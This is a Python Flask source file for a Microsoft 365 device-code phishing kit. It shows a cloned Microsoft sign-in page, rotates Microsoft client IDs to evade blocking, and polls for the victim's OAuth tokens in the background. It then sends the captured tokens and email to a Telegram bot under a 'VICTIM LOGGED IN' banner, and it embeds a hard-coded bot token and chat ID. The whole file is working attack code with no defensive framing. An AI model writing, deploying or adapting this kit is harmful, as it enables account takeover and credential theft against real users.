import os
import json
import time
import sqlite3
import requests
from flask import Flask, request, render_template_string, redirect, url_for

# --- CONFIG ---
TELEGRAM_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT = "8877118461"
DB_PATH = "/tmp/phish.db"

# Microsoft Public Client IDs (Rotated to avoid blocks)
CLIENT_IDS = [
    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Office
    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
    "268761a2-03f3-40df-8a8b-c3db24145b6b",  # OneDrive
]

app = Flask(__name__)

# --- DB SETUP ---
def init_db():
    con = sqlite3.connect(DB_PATH)
    con.execute("""CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_code TEXT,
        user_code TEXT,
        verification_uri TEXT,
        status TEXT DEFAULT 'PENDING',
        tokens TEXT,
        email TEXT,
        ts TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )""")
    con.commit()
    con.close()

init_db()

def save_session(device_code, user_code, uri):
    con = sqlite3.connect(DB_PATH)
    con.execute("INSERT INTO sessions (device_code, user_code, verification_uri) VALUES (?,?,?)",
                (device_code, user_code, uri))
    con.commit()
    con.close()

def update_session(device_code, status, tokens=None, email=None):
    con = sqlite3.connect(DB_PATH)
    con.execute("UPDATE sessions SET status=?, tokens=?, email=? WHERE device_code=?",
                (status, tokens, email, device_code))
    con.commit()
    con.close()

def send_telegram(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            data={"chat_id": TELEGRAM_CHAT, "text": text, "parse_mode": "HTML"},
            timeout=10
        )
    except Exception as e:
        print("Telegram Error:", e)

# --- MICROSOFT API HELPERS ---
def get_device_code(client_id):
    url = "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"
    data = {
        "client_id": client_id,
        "scope": "openid profile offline_access https://outlook.office.com/.default"
    }
    resp = requests.post(url, data=data)
    if resp.status_code == 200:
        return resp.json()
    return None

def poll_token(device_code, client_id):
    url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    data = {
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "device_code": device_code,
        "client_id": client_id
    }
    resp = requests.post(url, data=data)
    return resp

# --- ROUTES ---
@app.route("/")
def index():
    # Try each client ID until one works
    for cid in CLIENT_IDS:
        data = get_device_code(cid)
        if data:
            save_session(data['device_code'], data['user_code'], data['verification_uri'])
            # Start polling in background (simple thread for now)
            import threading
            t = threading.Thread(target=poll_loop, args=(data['device_code'], cid))
            t.daemon = True
            t.start()
            
            return render_template_string(TEMPLATE, 
                user_code=data['user_code'], 
                verification_uri=data['verification_uri'])
    
    return "Service unavailable. Please try again later.", 503

def poll_loop(device_code, client_id):
    while True:
        resp = poll_token(device_code, client_id)
        if resp.status_code == 200:
            tokens = resp.json()
            # Extract email from id_token if present
            email = "Unknown"
            if 'id_token' in tokens:
                import jwt
                try:
                    decoded = jwt.decode(tokens['id_token'], options={"verify_signature": False})
                    email = decoded.get('preferred_username', 'Unknown')
                except:
                    pass
            
            update_session(device_code, "SUCCESS", json.dumps(tokens), email)
            msg = f"<b>🎯 VICTIM LOGGED IN</b>\n\n<b>Email:</b> {email}\n\n<b>Tokens:</b>\n<code>{json.dumps(tokens, indent=2)}</code>"
            send_telegram(msg)
            break
        elif 'error' in resp.json() and resp.json()['error'] == 'authorization_pending':
            time.sleep(5)
        else:
            # Error or expired
            update_session(device_code, "FAILED")
            break

# --- HTML TEMPLATE ---
TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; padding: 44px; width: 440px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); border-radius: 2px; }
        .logo { width: 108px; margin-bottom: 24px; }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 16px; color: #1b1b1b; }
        p { font-size: 15px; color: #1b1b1b; margin-bottom: 24px; line-height: 1.5; }
        .code-box { background: #f0f2f4; padding: 12px; font-size: 24px; font-weight: 600; letter-spacing: 2px; text-align: center; margin-bottom: 24px; border: 1px solid #ccc; border-radius: 4px; cursor: pointer; }
        .btn { background: #0067b8; color: white; border: none; padding: 12px 24px; font-size: 15px; font-weight: 600; cursor: pointer; width: 100%; border-radius: 4px; }
        .btn:hover { background: #005da6; }
        .footer { margin-top: 24px; font-size: 12px; color: #666; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo.svg" class="logo" alt="Microsoft">
        <h1>Sign in</h1>
        <p>To sign in, use the code shown below and go to <a href="{{ verification_uri }}" target="_blank">{{ verification_uri }}</a></p>
        
        <div class="code-box" id="codeBox" onclick="copyCode()">{{ user_code }}</div>
        
        <button class="btn" onclick="openLogin()">Next</button>
        
        <div class="footer">
            &copy; 2026 Microsoft
        </div>
    </div>

    <script>
        function copyCode() {
            const code = document.getElementById('codeBox').innerText;
            navigator.clipboard.writeText(code).then(() => {
                alert('Code copied! Redirecting to Microsoft...');
                openLogin();
            });
        }
        function openLogin() {
            window.location.href = "{{ verification_uri }}";
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
